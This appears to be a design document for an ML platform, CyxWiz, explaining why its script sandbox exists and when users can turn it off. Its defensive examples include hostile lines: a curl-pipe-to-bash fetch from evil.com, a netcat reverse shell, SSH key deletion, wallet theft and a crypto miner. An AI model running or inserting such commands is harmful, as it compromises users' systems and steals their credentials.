# Sandbox Purpose and Use Cases

**Question:** "If sandbox can be turned off, why implement it in the first place?"

**Short Answer:** The sandbox is for **running untrusted code safely**. It's like antivirus software - you CAN turn it off, but you shouldn't when running unknown/shared scripts.

---

## Real-World Use Cases

### 1. **Script Marketplace / Template Sharing** ⭐ (PRIMARY USE CASE)

**Scenario:**
CyxWiz will have a marketplace where users share ML training scripts and templates.

**Without Sandbox:**
```python
# User downloads "MNIST Training Template" from marketplace
# Looks innocent, but contains:

import os
import sys

# Train the model (looks normal)
def train_model():
    # ... legitimate code ...
    pass

# Hidden malicious code
os.system("curl evil.com/steal.sh | bash")  # Steals your data!
os.remove("~/.ssh/id_rsa")  # Deletes your SSH keys!

# Opens backdoor
import subprocess
subprocess.Popen(["nc", "-e", "/bin/bash", "evil.com", "4444"])
```

**With Sandbox ON:**
```python
# Same malicious template
import os  # ✓ Allowed (os is whitelisted for file operations)

# But malicious operations are blocked:
os.system("...")       # ✗ BLOCKED by pattern validation ("os.system")
subprocess.Popen(...)  # ✗ BLOCKED - 'subprocess' not in whitelist
```

**Value:** Users can safely try community templates without risking their system.

---

### 2. **Blockchain Distributed Execution** 🌐

**CyxWiz Architecture:**
```
User (Engine Client)
    ↓ Submits training job
Central Server
    ↓ Assigns to
Server Node (Random stranger's computer!)
```

**The Problem:**
When you submit a training job, it runs on someone else's Server Node. They need protection!

**Server Node Perspective:**
```python
# You're a Server Node operator
# Someone submitted this "training script" to run on YOUR hardware:

import os
import sys

def train_model(data):
    # Looks like ML training...
    model = NeuralNetwork()

    # But actually mines Bitcoin on your GPU!
    os.system("./bitcoin_miner --use-gpu --server attacker.com")

    # And steals your wallet!
    with open("/home/user/.bitcoin/wallet.dat", "rb") as f:
        data = f.read()
        # Send to attacker...
```

**With Sandbox ON (Server Nodes):**
- ✓ Server Nodes ALWAYS run jobs with sandbox enabled
- ✓ Submitted scripts can only use whitelisted modules
- ✓ Can't access filesystem outside allowed directory
- ✓ Can't execute shell commands
- ✓ Can't steal data or mine crypto

**Value:** Server Node operators can safely rent out their compute without risk.

---

### 3. **Educational / Learning Environments** 🎓

**Scenario:**
A university uses CyxWiz to teach ML. Students submit homework scripts.

**Without Sandbox:**
```python
# Student's "homework.cyx"
import os

# Accidentally (or maliciously) deletes all training data
os.system("rm -rf /data/ml_datasets/*")

# Crashes the shared server
while True:
    x = [0] * 10**9  # Memory bomb!
```

**With Sandbox ON:**
- ✓ Can't delete files (write access blocked)
- ✓ Can't execute shell commands
- ✓ Memory limits enforced
- ✓ Timeout protection

**Value:** Professors can run student code safely without manual review.

---

### 4. **Automated Testing / CI/CD** 🔄

**Scenario:**
CyxWiz runs automated tests on community-contributed scripts before publishing.

**Test Pipeline:**
```
1. User submits template to marketplace
2. Automated CI runs it with sandbox ON
3. Checks:
   - ✓ Runs successfully
   - ✓ No security violations
   - ✓ No dangerous patterns
   - ✗ Reject if sandbox violations detected
4. Publish to marketplace
```

**Without Sandbox:**
- Every submission could compromise the CI server
- Need manual code review (slow, expensive)
- Still might miss subtle attacks

**With Sandbox:**
- ✓ Automated security testing
- ✓ Safe to run untrusted code
- ✓ Fast feedback to contributors

**Value:** Marketplace quality and security at scale.

---

### 5. **Production Deployments** 🏭

**Scenario:**
Company uses CyxWiz for production ML pipelines.

**Without Sandbox:**
```python
# data_pipeline.cyx - runs daily
import pandas as pd
import os

# Load data
df = pd.read_csv("sales_data.csv")

# BUG: Typo in command
os.system(f"rm -rf {temp_dir}")  # temp_dir is undefined!
# Actually runs: rm -rf /
# DELETES ENTIRE PRODUCTION DATABASE!
```

**With Sandbox ON:**
```python
# Same buggy script
os.system(...)  # ✗ BLOCKED by pattern validation
# Error logged, job fails safely
# Data NOT deleted
```

**Value:** Production safety net against bugs and typos.

---

## Why Allow Turning It OFF?

### 1. **Development Convenience** 🛠️

**During Development:**
```python
# You're developing a custom data loader
import pyodbc        # Not in default whitelist
import snowflake     # Not in default whitelist
import proprietary_lib  # Definitely not in whitelist

# You KNOW this code is safe (you wrote it!)
# Don't want to edit whitelist for every experiment
```

**Solution:** Sandbox OFF for development, ON for deployment/sharing.

---

### 2. **Advanced Use Cases** 🚀

**Legitimate Needs:**
```python
# Automated ML pipeline that needs to:
import subprocess  # Run external tools (TensorBoard, etc.)
import requests    # Download datasets from APIs
import boto3       # Upload results to S3

# These are blocked by default sandbox
# But legitimate for this specific use case
```

**Solution:**
- Sandbox OFF for trusted, internal scripts
- OR custom whitelist configuration for specific use cases

---

### 3. **Trust Model** 🤝

```
┌─────────────────────────────────────────┐
│        Trust Level        │  Sandbox?   │
├───────────────────────────┼─────────────┤
│ Your own scripts          │  OFF (fast) │
│ Teammate's scripts        │  OFF (team) │
│ Marketplace templates     │  ON (safe)  │
│ Student submissions       │  ON (safe)  │
│ Server Node execution     │  ON (must)  │
│ CI/CD testing            │  ON (auto)  │
└─────────────────────────────────────────┘
```

---

### 4. **Performance** ⚡

**Sandbox OFF:**
```python
import numpy as np  # Fast, direct import
result = np.array([1,2,3])  # No overhead
```

**Sandbox ON:**
```python
import numpy as np
# Goes through import hook
# Checks whitelist
# Logs to debug output
# Slightly slower (microseconds)
```

For development iteration speed, turning off sandbox helps.

---

## Security Comparison: Other Platforms

### Jupyter Notebooks
- **Default:** No sandbox
- **Risk:** Full system access
- **Mitigation:** "Don't run untrusted notebooks"
- **Problem:** People DO run untrusted notebooks!

### Google Colab
- **Default:** Sandboxed VM
- **Can disable:** No (VM is disposable)
- **Trade-off:** Limited filesystem access

### Kaggle Kernels
- **Default:** Sandboxed container
- **Can disable:** No
- **Trade-off:** Restricted internet access

### CyxWiz Approach
- **Default:** Sandbox OFF (development convenience)
- **Can enable:** Yes (one checkbox)
- **Best of both:** Flexibility for developers, safety for sharing

---

## Best Practices

### ✅ Enable Sandbox When:

1. **Running downloaded templates**
   ```python
   # Just downloaded from marketplace
   # Don't know what it does
   # Enable sandbox first!
   ```

2. **Testing unknown code**
   ```python
   # Friend sent you a script
   # Enable sandbox before running
   ```

3. **Server Node operation**
   ```python
   # Running jobs from strangers
   # ALWAYS enable sandbox
   ```

4. **CI/CD pipelines**
   ```python
   # Automated testing
   # Always sandboxed
   ```

### ⚠️ Disable Sandbox When:

1. **Developing your own scripts**
   ```python
   # You wrote it, you trust it
   # Faster iteration
   ```

2. **Using advanced features**
   ```python
   # Need modules not in whitelist
   # Known safe internal script
   ```

3. **Debugging**
   ```python
   # Trying to diagnose import issues
   # Test with sandbox OFF first
   ```

---

## The Answer: Defense in Depth

**Why implement sandbox if it can be turned off?**

Same reason we have:
- **Firewalls** (can be disabled)
- **Antivirus** (can be disabled)
- **HTTPS** (can fallback to HTTP)
- **Seatbelts** (can be unbuckled)

**The point is:**
1. ✅ **Available when needed** (running untrusted code)
2. ✅ **Optional when not** (development speed)
3. ✅ **Easy to toggle** (one checkbox)
4. ✅ **Enforced where critical** (Server Nodes)

---

## CyxWiz Specific: Blockchain Context

### Why This Matters More for CyxWiz

**Traditional ML Platforms:**
- Code runs on YOUR machine
- You control the risk
- Only affects you

**CyxWiz (Distributed):**
```
Your script runs on:
  1. Your local Engine (development)
  2. Random Server Node (training)
  3. Another user's Engine (if they download template)

Each context has different trust level!
```

**Solution:**
```python
# In Server Node (cyxwiz-server-node/src/job_executor.cpp)
void JobExecutor::ExecuteJob(Job job) {
    // ALWAYS enable sandbox for submitted jobs
    scripting_engine->EnableSandbox(true);

    // Set strict limits
    SandboxConfig config;
    config.timeout = 3600;  // 1 hour max
    config.max_memory_mb = 8192;  // 8GB max
    config.allowed_directory = job.workspace_path;  // Isolated

    scripting_engine->SetSandboxConfig(config);

    // Now safe to run untrusted code
    scripting_engine->ExecuteFile(job.script_path);
}
```

**Server Nodes MUST use sandbox** because they're running code from strangers!

---

## Future Enhancements

### 1. **Smart Defaults Based on Context**
```cpp
// In ScriptEditor
if (IsTemplateFromMarketplace(filepath)) {
    // Auto-enable sandbox for marketplace templates
    scripting_engine->EnableSandbox(true);
    ShowNotification("Sandbox enabled (marketplace template)");
}
```

### 2. **Script Signing**
```python
# Template metadata
{
    "name": "MNIST Training",
    "author": "JohnDoe",
    "signature": "...",  // Cryptographic signature
    "verified": true     // Author verified by CyxWiz team
}

# If verified author, lower security warnings
```

### 3. **Gradual Permissions**
```python
# Template requests permission
{
    "required_modules": ["numpy", "pandas", "requests"],
    "reason": "Downloads dataset from Kaggle API"
}

# User approves: "Allow 'requests' module for this template"
```

### 4. **Reputation System**
```python
# Template ratings
{
    "runs": 10000,
    "security_violations": 0,
    "rating": 4.8,
    "trusted": true
}

# High reputation = lower warnings
```

---

## Conclusion

### The Sandbox Is Essential Because:

1. **CyxWiz is a sharing platform** (marketplace templates)
2. **CyxWiz is distributed** (runs on stranger's nodes)
3. **CyxWiz handles valuable data** (ML datasets, models)
4. **Users aren't security experts** (need automatic protection)

### The Toggle Is Essential Because:

1. **Developers need speed** (iteration without friction)
2. **Advanced users need flexibility** (custom modules)
3. **Not all contexts need sandbox** (your own scripts)
4. **One size doesn't fit all** (different trust levels)

### The Right Balance:

```
┌─────────────────────────────────────────────────┐
│  Context          │  Default   │  Enforced?     │
├───────────────────┼────────────┼────────────────┤
│  Engine (dev)     │  OFF       │  User choice   │
│  Engine (shared)  │  ON (warn) │  User choice   │
│  Server Node      │  ON        │  YES (forced)  │
│  CI/CD            │  ON        │  YES (forced)  │
└─────────────────────────────────────────────────┘
```

**Result:**
- ✅ Security where needed
- ✅ Flexibility where wanted
- ✅ Best of both worlds

**Analogy:**
The sandbox is like a car's "valet mode" - you don't need it when YOU'RE driving, but when you hand the keys to someone else (marketplace templates, Server Nodes), you definitely want it enabled!

---

## Recommendation for Users

**Rule of Thumb:**
```
If you didn't write it → Enable sandbox
If you wrote it → Your choice
If it's running on Server Node → Sandbox forced ON
```

Simple, safe, sensible. 🎯
